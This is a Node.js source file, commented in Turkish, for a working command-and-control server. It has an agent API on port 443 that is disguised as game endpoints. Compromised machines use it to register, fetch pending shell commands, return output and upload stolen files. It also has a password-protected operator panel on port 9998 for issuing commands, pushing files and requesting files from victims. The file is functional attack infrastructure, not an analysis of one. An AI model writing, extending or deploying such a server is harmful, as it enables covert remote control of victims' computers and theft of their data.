const express = require('express');
const https = require('https');
const fs = require('fs');
const path = require('path');
const bodyParser = require('body-parser');
const session = require('express-session');
const multer = require('multer');

// Sabit şifre
const PASSWORD = 'mow0BEBWgooxBLCiAVTm';

// SSL sertifikalarını oku
const sslOptions = {
    key: fs.readFileSync(path.join(__dirname, 'certs', 'key.pem')),
    cert: fs.readFileSync(path.join(__dirname, 'certs', 'cert.pem'))
};

// Uploads klasörünü oluştur
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
    fs.mkdirSync(uploadsDir, { recursive: true });
}

// Multer konfigürasyonu
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, uploadsDir);
    },
    filename: function (req, file, cb) {
        const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
        cb(null, uniqueSuffix + '-' + file.originalname);
    }
});
const upload = multer({ storage: storage });

// Express uygulamaları
const app443 = express();
const app9998 = express();

// ============================================
// C2 SUNUCUSU VERİ YAPISI
// ============================================
let c2Data = {
    agents: {},
    connections: [],
    commands: {},
    commandResults: {},
    uploadedFiles: [],
    filesToSend: {},
    totalConnections: 0,
    lastUpdate: new Date().toISOString()
};

// Bağlantı takibi middleware
app443.use((req, res, next) => {
    const clientIp = req.socket.remoteAddress;
    const timestamp = new Date().toISOString();
    
    c2Data.connections.push({
        ip: clientIp,
        method: req.method,
        url: req.url,
        timestamp: timestamp
    });
    
    if (c2Data.connections.length > 100) {
        c2Data.connections = c2Data.connections.slice(-100);
    }
    
    c2Data.totalConnections++;
    next();
});

// Middleware'ler
app443.use(bodyParser.urlencoded({ extended: true, limit: '500mb' }));
app443.use(bodyParser.json({ limit: '500mb' }));
app443.use(bodyParser.text({ limit: '500mb' }));

app9998.use(bodyParser.urlencoded({ extended: true, limit: '500mb' }));
app9998.use(bodyParser.json({ limit: '500mb' }));

// Session middleware
app9998.use(session({
    secret: 'c2-sunucu-gizli-anahtar-2026',
    resave: false,
    saveUninitialized: true,
    cookie: { 
        secure: true,
        maxAge: 30 * 60 * 1000
    }
}));

// Statik dosyalar
app9998.use(express.static(path.join(__dirname, 'public')));
app9998.use('/uploads', express.static(uploadsDir));

// ============================================
// 443 PORTU - C2 İSTEMCİLERİ İÇİN API
// ============================================

// Test endpoint
app443.get('/test', (req, res) => {
    res.json({
        status: 'online',
        message: 'C2 Sunucusu çalışıyor',
        port: 443,
        agents: Object.keys(c2Data.agents).length,
        timestamp: Date.now()
    });
});

// Health check
app443.get('/health', (req, res) => {
    res.json({
        status: 'healthy',
        uptime: process.uptime(),
        agents: Object.keys(c2Data.agents).length,
        totalConnections: c2Data.totalConnections
    });
});

// AJAN KAYDI
app443.post('/api/game/register', (req, res) => {
    const { playerId, playerName, system_info } = req.body;
    const clientIp = req.socket.remoteAddress;
    
    c2Data.agents[playerId] = {
        id: playerId,
        name: playerName || 'İsimsiz Ajan',
        ip: clientIp,
        firstSeen: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        status: 'online',
        system_info: system_info || {},
        pendingCommand: null,
        pendingFile: null,
        lastCommandId: null,
        commandHistory: [],
        outputHistory: [],
        uploadedFiles: []
    };
    
    res.json({
        success: true,
        playerId: playerId,
        message: 'Ajan kaydı başarılı',
        agentsOnline: Object.keys(c2Data.agents).length
    });
});

// VERİ GÖNDERME
app443.post('/api/game/data', (req, res) => {
    const { playerId, action, data } = req.body;
    const clientIp = req.socket.remoteAddress;
    
    if (playerId && c2Data.agents[playerId]) {
        c2Data.agents[playerId].lastSeen = new Date().toISOString();
        c2Data.agents[playerId].ip = clientIp;
        c2Data.agents[playerId].status = 'online';
        
        // KOMUT ÇIKTISI
        if (action === 'command_output') {
            const outputData = data || {};
            
            c2Data.agents[playerId].outputHistory.push({
                command: outputData.command,
                output: outputData.output,
                timestamp: outputData.timestamp
            });
            
            if (!c2Data.commandResults[playerId]) {
                c2Data.commandResults[playerId] = [];
            }
            c2Data.commandResults[playerId].push({
                command_id: outputData.command_id,
                command: outputData.command,
                output: outputData.output,
                timestamp: new Date().toISOString()
            });
        }
        
        // DOSYA YÜKLEME (Ajandan sunucuya)
        if (action === 'file_upload') {
            const fileData = data || {};
            
            const fileId = `file_${Date.now()}_${Math.random().toString(36).substring(7)}`;
            const filePath = path.join(uploadsDir, `${fileId}_${fileData.filename}`);
            
            try {
                const fileBuffer = Buffer.from(fileData.content, 'base64');
                fs.writeFileSync(filePath, fileBuffer);
                
                const fileRecord = {
                    id: fileId,
                    agentId: playerId,
                    agentName: c2Data.agents[playerId].name,
                    filename: fileData.filename,
                    filepath: filePath,
                    size: fileData.filesize,
                    timestamp: new Date().toISOString(),
                    type: 'from_agent'
                };
                
                c2Data.uploadedFiles.push(fileRecord);
                c2Data.agents[playerId].uploadedFiles.push(fileRecord);
                
            } catch (err) {
                console.error(`[443] Dosya kaydetme hatası: ${err}`);
            }
        }
        
        // DOSYA ALINDI BİLDİRİMİ
        if (action === 'file_received') {
            const fileId = data?.fileId;
            
            if (c2Data.agents[playerId].pendingFile?.id === fileId) {
                c2Data.agents[playerId].pendingFile = null;
            }
        }
        
        // KOMUT ALINDI BİLDİRİMİ
        if (action === 'command_ack') {
            const commandId = data?.command_id;
            
            if (c2Data.agents[playerId].pendingCommand?.id === commandId) {
                c2Data.agents[playerId].pendingCommand = null;
            }
        }
        
        // HEARTBEAT
        if (action === 'heartbeat' || action === 'shutdown') {
        }
    }
    
    res.json({
        success: true,
        message: 'Veri alındı',
        serverTime: new Date().toISOString(),
        agentsOnline: Object.keys(c2Data.agents).length
    });
});

// DURUM SORGULAMA
app443.get('/api/game/status/:playerId', (req, res) => {
    const playerId = req.params.playerId;
    const clientIp = req.socket.remoteAddress;
    
    if (playerId && c2Data.agents[playerId]) {
        c2Data.agents[playerId].lastSeen = new Date().toISOString();
        c2Data.agents[playerId].ip = clientIp;
        c2Data.agents[playerId].status = 'online';
        
        const response = {
            success: true,
            playersOnline: Object.keys(c2Data.agents).length,
            gameData: {}
        };
        
        // Bekleyen komut var mı?
        if (c2Data.agents[playerId].pendingCommand) {
            response.gameData.command = c2Data.agents[playerId].pendingCommand.command;
            response.gameData.command_id = c2Data.agents[playerId].pendingCommand.id;
        }
        
        // Gönderilecek dosya var mı?
        if (c2Data.agents[playerId].pendingFile) {
            response.gameData.file = {
                id: c2Data.agents[playerId].pendingFile.id,
                name: c2Data.agents[playerId].pendingFile.name,
                size: c2Data.agents[playerId].pendingFile.size,
                content: c2Data.agents[playerId].pendingFile.content
            };
        }
        
        res.json(response);
        return;
    }
    
    res.json({
        success: true,
        playersOnline: Object.keys(c2Data.agents).length,
        gameData: {}
    });
});

// DOSYA YÜKLEME ENDPOINT'İ (Ajandan) - GÜNCELLENMİŞ VERSİYON
app443.post('/api/agent/upload', (req, res) => {
    const { agentId, file } = req.body;
    
    console.log(`[443] Dosya yükleme - Ajan: ${agentId}, Dosya: ${file.name} (${file.size} bytes)`);
    
    // DÜZGÜN DOSYA ADI: file_timestamp_random_filename
    const timestamp = Date.now();
    const random = Math.random().toString(36).substring(7);
    const fileId = `file_${timestamp}_${random}`;
    
    // Dosya adındaki özel karakterleri temizle
    const safeFilename = file.name.replace(/[^a-zA-Z0-9._-]/g, '_');
    const filePath = path.join(uploadsDir, `${fileId}_${safeFilename}`);
    
    try {
        const fileBuffer = Buffer.from(file.content, 'base64');
        fs.writeFileSync(filePath, fileBuffer);
        
        const fileRecord = {
            id: fileId,
            agentId: agentId,
            agentName: c2Data.agents[agentId]?.name || agentId,
            filename: file.name,
            filepath: filePath,
            size: file.size,
            timestamp: new Date().toISOString(),
            type: 'from_agent'
        };
        
        c2Data.uploadedFiles.push(fileRecord);
        
        if (c2Data.agents[agentId]) {
            if (!c2Data.agents[agentId].uploadedFiles) {
                c2Data.agents[agentId].uploadedFiles = [];
            }
            c2Data.agents[agentId].uploadedFiles.push(fileRecord);
        }
        
        console.log(`[443] Dosya kaydedildi: ${filePath}`);
        res.json({ success: true, file_id: fileId });
        
    } catch (err) {
        console.error(`[443] Dosya kaydetme hatası: ${err}`);
        res.status(500).json({ error: 'Dosya kaydedilemedi' });
    }
});

// 404 handler
app443.use((req, res) => {
    res.status(404).json({ 
        error: 'Endpoint bulunamadı',
        availableEndpoints: [
            'GET /test',
            'GET /health',
            'POST /api/game/register',
            'POST /api/game/data',
            'GET /api/game/status/:playerId',
            'POST /api/agent/upload'
        ]
    });
});

// ============================================
// 9998 PORTU - YÖNETİCİ WEB ARAYÜZÜ
// ============================================

// Login
app9998.get('/', (req, res) => {
    if (req.session.authenticated) {
        res.redirect('/dashboard');
    } else {
        res.sendFile(path.join(__dirname, 'public', 'login.html'));
    }
});

app9998.post('/login', (req, res) => {
    const { password } = req.body;
    if (password === PASSWORD) {
        req.session.authenticated = true;
        res.redirect('/dashboard');
    } else {
        res.redirect('/?error=1');
    }
});

app9998.get('/logout', (req, res) => {
    req.session.destroy();
    res.redirect('/');
});

// Dashboard
app9998.get('/dashboard', (req, res) => {
    if (!req.session.authenticated) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'dashboard.html'));
});

// Dosya yönetim sayfası (FILES)
app9998.get('/files', (req, res) => {
    if (!req.session.authenticated) {
        return res.redirect('/');
    }
    res.sendFile(path.join(__dirname, 'public', 'files.html'));
});

// API - Tüm ajanları listele
app9998.get('/api/agents', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const agentsList = Object.keys(c2Data.agents).map(agentId => {
        const agent = c2Data.agents[agentId];
        const isOnline = (new Date() - new Date(agent.lastSeen)) < 60000;
        
        return {
            id: agent.id,
            name: agent.name,
            ip: agent.ip,
            firstSeen: agent.firstSeen,
            lastSeen: agent.lastSeen,
            status: isOnline ? 'online' : 'offline',
            hasPendingCommand: agent.pendingCommand !== null,
            hasPendingFile: agent.pendingFile !== null,
            fileCount: agent.uploadedFiles?.length || 0,
            commandCount: agent.commandHistory?.length || 0,
            system_info: agent.system_info || {}
        };
    });
    
    res.json({
        success: true,
        total: agentsList.length,
        agents: agentsList,
        connections: c2Data.connections.slice(-50),
        stats: {
            totalConnections: c2Data.totalConnections,
            onlineAgents: agentsList.filter(a => a.status === 'online').length,
            totalAgents: agentsList.length,
            totalFiles: c2Data.uploadedFiles.length
        }
    });
});

// API - Tek ajan detayı
app9998.get('/api/agents/:agentId', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const agentId = req.params.agentId;
    const agent = c2Data.agents[agentId];
    
    if (!agent) {
        return res.status(404).json({ error: 'Ajan bulunamadı' });
    }
    
    const isOnline = (new Date() - new Date(agent.lastSeen)) < 60000;
    
    res.json({
        success: true,
        agent: {
            ...agent,
            status: isOnline ? 'online' : 'offline',
            commandHistory: agent.commandHistory?.slice(-20) || [],
            outputHistory: agent.outputHistory?.slice(-20) || [],
            uploadedFiles: agent.uploadedFiles?.slice(-20) || []
        },
        commandResults: c2Data.commandResults[agentId]?.slice(-20) || []
    });
});

// API - Ajan'a komut gönder
app9998.post('/api/agents/:agentId/command', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const agentId = req.params.agentId;
    const { command } = req.body;
    
    if (!command) {
        return res.status(400).json({ error: 'Komut gerekli' });
    }
    
    const agent = c2Data.agents[agentId];
    if (!agent) {
        return res.status(404).json({ error: 'Ajan bulunamadı' });
    }
    
    const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    agent.pendingCommand = {
        id: commandId,
        command: command,
        timestamp: new Date().toISOString(),
        status: 'pending'
    };
    
    if (!agent.commandHistory) {
        agent.commandHistory = [];
    }
    agent.commandHistory.push({
        id: commandId,
        command: command,
        timestamp: new Date().toISOString(),
        status: 'pending'
    });
    
    res.json({
        success: true,
        message: 'Komut gönderildi',
        commandId: commandId
    });
});

// API - Ajan'a dosya gönder
app9998.post('/api/agents/:agentId/send-file', upload.single('file'), (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const agentId = req.params.agentId;
    const agent = c2Data.agents[agentId];
    
    if (!agent) {
        return res.status(404).json({ error: 'Ajan bulunamadı' });
    }
    
    if (!req.file) {
        return res.status(400).json({ error: 'Dosya gerekli' });
    }
    
    const filePath = req.file.path;
    const fileName = req.file.originalname;
    const fileSize = req.file.size;
    
    try {
        const fileContent = fs.readFileSync(filePath);
        const base64Content = fileContent.toString('base64');
        
        const fileId = `file_${Date.now()}_${Math.random().toString(36).substring(7)}`;
        
        agent.pendingFile = {
            id: fileId,
            name: fileName,
            size: fileSize,
            content: base64Content
        };
        
        const fileRecord = {
            id: fileId,
            agentId: agentId,
            agentName: agent.name,
            filename: fileName,
            filepath: filePath,
            size: fileSize,
            timestamp: new Date().toISOString(),
            type: 'to_agent'
        };
        
        c2Data.uploadedFiles.push(fileRecord);
        
        console.log(`[9998] Dosya gönderilecek - Ajan: ${agentId}, Dosya: ${fileName}`);
        
        res.json({
            success: true,
            message: 'Dosya gönderiliyor',
            fileId: fileId,
            fileName: fileName,
            fileSize: fileSize
        });
        
    } catch (err) {
        console.error(`[9998] Dosya okuma hatası: ${err}`);
        res.status(500).json({ error: 'Dosya okunamadı' });
    }
});

// API - Dosya indirme isteği
app9998.post('/api/agents/:agentId/request-file', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const agentId = req.params.agentId;
    const { filePath } = req.body;
    
    if (!filePath) {
        return res.status(400).json({ error: 'Dosya yolu gerekli' });
    }
    
    const agent = c2Data.agents[agentId];
    if (!agent) {
        return res.status(404).json({ error: 'Ajan bulunamadı' });
    }
    
    const command = `upload "${filePath}"`;
    const commandId = `cmd_${Date.now()}_${Math.random().toString(36).substring(7)}`;
    
    agent.pendingCommand = {
        id: commandId,
        command: command,
        timestamp: new Date().toISOString(),
        status: 'pending'
    };
    
    agent.commandHistory.push({
        id: commandId,
        command: command,
        timestamp: new Date().toISOString(),
        status: 'pending'
    });
    
    console.log(`[9998] Dosya isteği gönderildi - Ajan: ${agentId}, Dosya: ${filePath}`);
    
    res.json({
        success: true,
        message: 'Dosya isteği gönderildi',
        commandId: commandId
    });
});

// API - Tüm dosyaları listele (FILES SAYFASI İÇİN)
app9998.get('/api/files', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const sortedFiles = [...c2Data.uploadedFiles].sort((a, b) => 
        new Date(b.timestamp) - new Date(a.timestamp)
    );
    
    res.json({
        success: true,
        total: sortedFiles.length,
        files: sortedFiles
    });
});

// API - Dosya indir (Browser'a direkt)
app9998.get('/api/files/:fileId/download', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const fileId = req.params.fileId;
    const file = c2Data.uploadedFiles.find(f => f.id === fileId);
    
    if (!file) {
        return res.status(404).json({ error: 'Dosya bulunamadı' });
    }
    
    console.log(`[9998] Dosya indiriliyor: ${file.filename}`);
    res.download(file.filepath, file.filename);
});

// API - Dosya sil
app9998.delete('/api/files/:fileId', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    const fileId = req.params.fileId;
    const fileIndex = c2Data.uploadedFiles.findIndex(f => f.id === fileId);
    
    if (fileIndex === -1) {
        return res.status(404).json({ error: 'Dosya bulunamadı' });
    }
    
    const file = c2Data.uploadedFiles[fileIndex];
    
    try {
        if (fs.existsSync(file.filepath)) {
            fs.unlinkSync(file.filepath);
        }
    } catch (err) {
        console.error(`Dosya silme hatası: ${err}`);
    }
    
    c2Data.uploadedFiles.splice(fileIndex, 1);
    
    res.json({ success: true, message: 'Dosya silindi' });
});

// Canlı güncellemeler
app9998.get('/api/live/updates', (req, res) => {
    if (!req.session.authenticated) {
        return res.status(401).json({ error: 'Yetkisiz erişim' });
    }
    
    res.writeHead(200, {
        'Content-Type': 'text/event-stream',
        'Cache-Control': 'no-cache',
        'Connection': 'keep-alive'
    });
    
    const interval = setInterval(() => {
        const agentsList = Object.keys(c2Data.agents).map(agentId => {
            const agent = c2Data.agents[agentId];
            const isOnline = (new Date() - new Date(agent.lastSeen)) < 60000;
            
            return {
                id: agent.id,
                name: agent.name,
                ip: agent.ip,
                status: isOnline ? 'online' : 'offline',
                lastSeen: agent.lastSeen,
                hasPendingCommand: agent.pendingCommand !== null,
                hasPendingFile: agent.pendingFile !== null
            };
        });
        
        res.write(`data: ${JSON.stringify({
            type: 'update',
            agents: agentsList,
            onlineCount: agentsList.filter(a => a.status === 'online').length,
            totalCount: agentsList.length,
            lastConnections: c2Data.connections.slice(-5),
            timestamp: new Date().toISOString()
        })}\n\n`);
    }, 3000);
    
    req.on('close', () => {
        clearInterval(interval);
    });
});

// 404 handler
app9998.use((req, res) => {
    res.status(404).sendFile(path.join(__dirname, 'public', 'login.html'));
});

// ============================================
// UPLOADS KLASÖRÜNÜ TARA (SERVER BAŞLARKEN)
// ============================================
function scanUploadsFolder() {
    console.log('📂 Uploads klasörü taranıyor...');
    
    try {
        const files = fs.readdirSync(uploadsDir);
        let loadedCount = 0;
        
        files.forEach(file => {
            const filePath = path.join(uploadsDir, file);
            const stat = fs.statSync(filePath);
            
            // Sadece dosyaları al (dizinleri atla)
            if (!stat.isFile()) return;
            
            // Dosya adı formatını kontrol et (file_timestamp_random_filename)
            let fileId = null;
            let filename = file;
            
            // Dosya adı file_ ile başlıyorsa ID'yi ayır
            if (file.startsWith('file_')) {
                const parts = file.split('_');
                if (parts.length >= 3) {
                    fileId = parts.slice(0, 3).join('_'); // file_timestamp_random
                    filename = parts.slice(3).join('_'); // kalanı dosya adı
                }
            }
            
            // ID yoksa yeni oluştur
            if (!fileId) {
                fileId = `file_${Date.now()}_${Math.random().toString(36).substring(7)}`;
            }
            
            // Dosya zaten listede var mı kontrol et
            const exists = c2Data.uploadedFiles.some(f => f.filepath === filePath);
            
            if (!exists) {
                // Agent bilgisini bul (dosya adından veya varsayılan)
                let agentId = 'unknown';
                let agentName = 'Sunucu';
                
                c2Data.uploadedFiles.push({
                    id: fileId,
                    agentId: agentId,
                    agentName: agentName,
                    filename: filename,
                    filepath: filePath,
                    size: stat.size,
                    timestamp: stat.mtime.toISOString(),
                    type: 'from_agent'
                });
                
                loadedCount++;
            }
        });
        
        console.log(`✅ Uploads klasöründen ${loadedCount} dosya yüklendi. Toplam: ${c2Data.uploadedFiles.length}`);
        
    } catch (err) {
        console.error('❌ Uploads klasörü taranırken hata:', err.message);
    }
}

// Yardımcı fonksiyon - yerel IP'yi bul
function getLocalIP() {
    const nets = require('os').networkInterfaces();
    for (const name of Object.keys(nets)) {
        for (const net of nets[name]) {
            if (net.family === 'IPv4' && !net.internal) {
                return net.address;
            }
        }
    }
    return '127.0.0.1';
}

// ============================================
// HTTPS SERVER'LARI BAŞLAT
// ============================================
console.log('🚀 C2 Sunucusu başlatılıyor...\n');

// Uploads klasörünü tara
scanUploadsFolder();

const server443 = https.createServer(sslOptions, app443);
const server9998 = https.createServer(sslOptions, app9998);

// Tüm ağ arayüzlerinde dinle (0.0.0.0)
server443.listen(443, '0.0.0.0', () => {
    console.log('🎯 443 PORTU - C2 SUNUCU API');
    console.log('   → Ajanlar bu porta bağlanacak');
    console.log('   → Test için: curl -k https://<IP_BURAYA>:443/test\n');
});

server9998.listen(9998, '0.0.0.0', () => {
    console.log('🕹️  9998 PORTU - YÖNETİCİ PANELİ');
    console.log('   → https://<IP_BURAYA>:9998');
    console.log(`   → Şifre: ${PASSWORD}`);
    console.log('   → Dosya yönetimi: https://<IP_BURAYA>:9998/files\n');
});

// Hata yakalama
server443.on('error', (err) => {
    if (err.code === 'EACCES') {
        console.error('❌ 443 portu için yetki gerekli! (sudo ile çalıştırın)');
    } else {
        console.error('❌ 443 port hatası:', err.message);
    }
});

server9998.on('error', (err) => {
    console.error('❌ 9998 port hatası:', err.message);
});

console.log(`📊 Başlangıç zamanı: ${new Date().toLocaleString()}`);
console.log(`📁 Uploads klasörü: ${uploadsDir}`);
console.log(`🌐 Ağdaki diğer cihazlardan erişim için IP: ${getLocalIP()}\n`);
